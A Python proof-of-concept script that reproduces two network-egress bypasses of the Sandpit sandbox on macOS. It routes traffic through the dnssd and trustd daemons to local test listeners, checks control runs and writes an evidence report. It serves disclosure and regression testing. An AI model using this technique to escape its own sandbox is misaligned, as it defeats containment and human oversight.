#!/usr/bin/env python3
"""Reproduce two daemon-mediated network bypasses through a normal Sandpit launch."""
import argparse
import datetime
import hashlib
import http.server
import json
import os
from pathlib import Path
import platform
import re
import socket
import struct
import subprocess
import threading
import uuid


def tls_server_name(record):
    """Extract SNI from the first TLS ClientHello record captured by our server."""
    try:
        if record[0] != 22 or record[5] != 1:
            return None
        position = 9 + 2 + 32
        position += 1 + record[position]
        length = struct.unpack_from('!H', record, position)[0]
        position += 2 + length
        position += 1 + record[position]
        end = position + 2 + struct.unpack_from('!H', record, position)[0]
        position += 2
        if end > len(record):
            return None
        while position + 4 <= end:
            kind, length = struct.unpack_from('!HH', record, position)
            position += 4
            if position + length > end:
                return None
            if kind == 0 and length >= 5 and record[position + 2] == 0:
                name_length = struct.unpack_from('!H', record, position + 3)[0]
                if name_length + 5 > length:
                    return None
                return record[position + 5:position + 5 + name_length].decode('ascii')
            position += length
    except (IndexError, struct.error, UnicodeError):
        return None
    return None


class TLSObserver:
    def __init__(self, forbidden_ports):
        while True:
            self.socket = socket.socket()
            self.socket.bind(('127.0.0.1', 0))
            self.port = self.socket.getsockname()[1]
            if self.port not in forbidden_ports:
                break
            self.socket.close()
        self.socket.listen(16)
        self.socket.settimeout(0.1)
        self.records = []
        self.errors = []
        self.done = threading.Event()
        self.thread = threading.Thread(target=self.observe)

    def observe(self):
        while not self.done.is_set():
            try:
                peer, address = self.socket.accept()
            except TimeoutError:
                continue
            with peer:
                peer.settimeout(0.5)
                data = b''
                try:
                    while len(data) < 32768:
                        part = peer.recv(4096)
                        if not part:
                            break
                        data += part
                        if len(data) >= 5 and len(data) >= 5 + int.from_bytes(data[3:5], 'big'):
                            break
                except (TimeoutError, ConnectionError) as error:
                    self.errors.append(type(error).__name__)
                self.records.append({'peer': list(address), 'bytes': len(data),
                                     'sni': tls_server_name(data),
                                     'sha256': hashlib.sha256(data).hexdigest()})

    def start(self):
        self.thread.start()

    def close(self):
        self.done.set()
        self.thread.join()
        self.socket.close()


def make_certificates(directory, port, marker, env):
    def openssl(*args):
        result = subprocess.run(['/usr/bin/openssl', *args], cwd=directory, env=env,
                                capture_output=True, text=True, timeout=15)
        if result.returncode:
            raise RuntimeError(result.stderr)

    (directory / 'root.cnf').write_text(
        '[req]\ndistinguished_name=dn\nx509_extensions=ext\n[dn]\n[ext]\n'
        'basicConstraints=critical,CA:TRUE\nkeyUsage=critical,keyCertSign,cRLSign\n'
        'subjectKeyIdentifier=hash\n')
    (directory / 'csr.cnf').write_text('[req]\ndistinguished_name=dn\n[dn]\n')
    (directory / 'intermediate.ext').write_text(
        'basicConstraints=critical,CA:TRUE,pathlen:0\nkeyUsage=critical,keyCertSign,cRLSign\n'
        'subjectKeyIdentifier=hash\nauthorityKeyIdentifier=keyid,issuer\n')
    (directory / 'leaf.ext').write_text(
        'basicConstraints=critical,CA:FALSE\nkeyUsage=digitalSignature\n'
        'authorityKeyIdentifier=keyid,issuer\n'
        f'authorityInfoAccess=caIssuers;URI:http://127.0.0.1:{port}/{marker}.der\n')
    try:
        for name in ('root', 'intermediate', 'leaf'):
            openssl('ecparam', '-name', 'prime256v1', '-genkey', '-noout', '-out', name + '.key')
        openssl('req', '-new', '-x509', '-key', 'root.key', '-out', 'root.pem', '-subj',
                '/CN=SandpitRoot-' + marker, '-days', '2', '-sha256', '-config', 'root.cnf')
        for name, issuer in (('intermediate', 'root'), ('leaf', 'intermediate')):
            openssl('req', '-new', '-key', name + '.key', '-out', name + '.csr', '-subj',
                    '/CN=SP-' + name + '-' + marker, '-config', 'csr.cnf')
            openssl('x509', '-req', '-in', name + '.csr', '-CA', issuer + '.pem', '-CAkey',
                    issuer + '.key', '-set_serial', '0x' + uuid.uuid4().hex, '-out', name + '.pem',
                    '-days', '1', '-sha256', '-extfile', name + '.ext')
        for name in ('root', 'intermediate', 'leaf'):
            openssl('x509', '-in', name + '.pem', '-outform', 'DER', '-out', name + '.der')
    finally:
        for path in directory.glob('*.key'):
            path.unlink()


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    source = Path(__file__).resolve().parent
    repo = source.parents[1]
    parser.add_argument('--sandpit', type=Path, default=repo / 'target/release/sandpit')
    parser.add_argument('--output', type=Path)
    parser.add_argument('--only', choices=('dnssd', 'trustd'))
    parser.add_argument('--expect', choices=('bypass', 'blocked'), default='bypass',
                        help='Expected result of the network-restricted Sandpit launch')
    args = parser.parse_args()
    if platform.system() != 'Darwin':
        parser.error('macOS required')
    binary = args.sandpit.resolve(strict=True)
    output = (args.output or repo / 'target' / ('xpc-egress-' + uuid.uuid4().hex)).resolve()
    output.mkdir(parents=True, exist_ok=False)
    (output / 'home').mkdir()
    env = {key: value for key, value in os.environ.items()
           if not key.startswith(('SANDPIT_', 'DYLD_', 'POC_'))}
    env.update(DEVELOPER_DIR='/Library/Developer/CommandLineTools', HOME=str(output / 'home'),
               XDG_CONFIG_HOME=str(output / 'home/.config'), OTEL_SDK_DISABLED='true')
    config = output / 'policy.toml'
    logs = ('[logs]\npath = ' + json.dumps(str(output / 'sandpit.log')) + '\naudit_path = '
            + json.dumps(str(output / 'network.jsonl')) + '\n')
    config.write_text('[network]\nallow = ["no-destinations-allowed.invalid"]\n' + logs)
    unrestricted_config = output / 'unrestricted.toml'
    unrestricted_config.write_text(logs)
    prefix = [str(binary), 'run', '--no-adversary', '--config', str(config), '--', '/usr/bin/env']
    unrestricted_prefix = [str(binary), 'run', '--no-adversary', '--config', str(unrestricted_config),
                           '--', '/usr/bin/env']
    report = {'time': datetime.datetime.now(datetime.timezone.utc).isoformat(),
              'platform': platform.platform(), 'sandpit': str(binary),
              'binary_sha256': hashlib.sha256(binary.read_bytes()).hexdigest(),
              'checkout_commit': subprocess.check_output(['git', 'rev-parse', 'HEAD'], cwd=repo, text=True).strip(),
              'expected': args.expect, 'cases': [], 'confirmed': {}, 'cleanup': {}}

    def save():
        (output / 'report.json').write_text(json.dumps(report, indent=2) + '\n')

    def run(name, command, process_env):
        result = subprocess.run([str(arg) for arg in command], cwd=output, env=process_env,
                                capture_output=True, text=True, timeout=25)
        case = {'name': name, 'command': [str(arg) for arg in command],
                'returncode': result.returncode, 'stdout': result.stdout, 'stderr': result.stderr,
                'events': [json.loads(line) for line in result.stdout.splitlines() if line.startswith('{')]}
        report['cases'].append(case)
        save()
        return case

    services = {'dnssd': ['com.apple.dnssd.service'],
                'trustd': ['com.apple.trustd.agent', 'com.apple.trustd']}
    try:
        for kind in ([args.only] if args.only else ['dnssd', 'trustd']):
            helper = output / (kind + '-egress')
            libraries = ['-fblocks'] if kind == 'dnssd' else ['-framework', 'Security', '-framework', 'CoreFoundation']
            build = run('build-' + kind, ['/usr/bin/clang', '-Wall', '-Wextra', '-Werror',
                        *libraries, source / (kind + '-egress.c'), '-o', helper], env)
            if build['returncode']:
                raise RuntimeError(build['stderr'])
            outcomes = {}
            captured = output / (kind + '-sandpit/kernel.sb')
            control = output / (kind + '-denied.sb')
            for mode in ('baseline', 'unrestricted', 'sandpit', 'denied'):
                directory = output / (kind + '-' + mode)
                directory.mkdir()
                marker = 'sandpit-poc-' + uuid.uuid4().hex
                forbidden_ports = set()
                if mode == 'denied':
                    profile = captured.read_text()
                    forbidden_ports = {int(value) for value in re.findall(r'\(remote ip "localhost:(\d+)"\)', profile)}
                    control.write_text(profile + '\n(deny mach-lookup ' + ' '.join(
                        '(global-name "' + name + '")' for name in services[kind]) + ')\n')
                if kind == 'dnssd':
                    observer = TLSObserver(forbidden_ports)
                    port = observer.port
                    command = [helper, marker + '.example.com', str(port)]
                    observer.start()
                    close_server = observer.close
                    observed = observer.records
                else:
                    observed = []

                    class Handler(http.server.BaseHTTPRequestHandler):
                        def do_GET(self):
                            observed.append({'path': self.path})
                            if self.path != '/' + marker + '.der':
                                self.send_error(404)
                                return
                            data = (directory / 'intermediate.der').read_bytes()
                            self.send_response(200)
                            self.send_header('Content-Type', 'application/pkix-cert')
                            self.send_header('Content-Length', str(len(data)))
                            self.end_headers()
                            self.wfile.write(data)

                        def log_message(self, *values):
                            pass

                    while True:
                        server = http.server.ThreadingHTTPServer(('127.0.0.1', 0), Handler)
                        port = server.server_port
                        if port not in forbidden_ports:
                            break
                        server.server_close()
                    try:
                        make_certificates(directory, port, marker, env)
                    except BaseException:
                        server.server_close()
                        raise
                    thread = threading.Thread(target=server.serve_forever)
                    thread.start()

                    def close_server():
                        server.shutdown()
                        server.server_close()
                        thread.join()

                    command = [helper, directory / 'leaf.der', directory / 'root.der', str(port)]
                try:
                    case_env = dict(env)
                    if mode == 'sandpit':
                        case_env['POC_CAPTURE_PROFILE'] = str(captured)
                        command = [*prefix, *command]
                    elif mode == 'unrestricted':
                        case_env['POC_CAPTURE_PROFILE'] = str(directory / 'kernel.sb')
                        command = [*unrestricted_prefix, *command]
                    elif mode == 'denied':
                        command = ['/usr/bin/sandbox-exec', '-f', control, *command]
                    case = run(kind + '-' + mode, command, case_env)
                finally:
                    close_server()
                case.update(marker=marker, listener_port=port, observed=observed)
                events = {entry['event']: entry for entry in case['events']}
                direct = events.get('direct-connect', {})
                seen = any(entry.get('sni') == marker + '.example.com' for entry in observed) if kind == 'dnssd' \
                    else any(entry.get('path') == '/' + marker + '.der' for entry in observed)
                outcomes[mode] = {'direct_allowed': direct.get('allowed'),
                                  'direct_errno': direct.get('errno'), 'marker_received': seen,
                                  'completed': case['returncode'] == 0}
                if kind == 'dnssd':
                    outcomes[mode]['operation_succeeded'] = events.get('dnssd-reply', {}).get('accepted') is True
                else:
                    outcomes[mode]['operation_succeeded'] = events.get('trust-evaluation', {}).get('trusted') is True
                if mode in ('sandpit', 'unrestricted'):
                    process = events.get('process', {})
                    assert process.get('sandpit_config') is True and process.get('dyld_interposed') is False
                    case['profile_sha256'] = hashlib.sha256((directory / 'kernel.sb').read_bytes()).hexdigest()
                save()
                print(json.dumps({'case': case['name'], **outcomes[mode]}), flush=True)
            baseline, unrestricted, attack, denied = (outcomes[name] for name in
                                                      ('baseline', 'unrestricted', 'sandpit', 'denied'))
            bypass_observed = attack['marker_received'] and attack['operation_succeeded']
            expected_result = bypass_observed if args.expect == 'bypass' else (
                not attack['marker_received'] and not attack['operation_succeeded'])
            confirmed = all(value['completed'] for value in outcomes.values()) \
                and baseline['direct_allowed'] is True and baseline['marker_received'] \
                and baseline['operation_succeeded'] and unrestricted['direct_allowed'] is True \
                and unrestricted['marker_received'] and unrestricted['operation_succeeded'] \
                and attack['direct_allowed'] is False and attack['direct_errno'] in (1, 13) \
                and expected_result and denied['direct_allowed'] is False \
                and denied['direct_errno'] in (1, 13) and not denied['marker_received'] \
                and not denied['operation_succeeded']
            report['confirmed'][kind] = {'confirmed': confirmed, 'bypass_observed': bypass_observed,
                                         'outcomes': outcomes,
                                         'mitigation_services': services[kind]}
            save()
            if not confirmed:
                raise RuntimeError(kind + ' did not match --expect ' + args.expect
                                   + ' with all controls; inspect report.json')
        report['completed'] = True
    finally:
        report['cleanup']['synthetic_private_keys_removed'] = not any(output.rglob('*.key'))
        save()
        print('Evidence: ' + str(output / 'report.json'), flush=True)


if __name__ == '__main__':
    main()
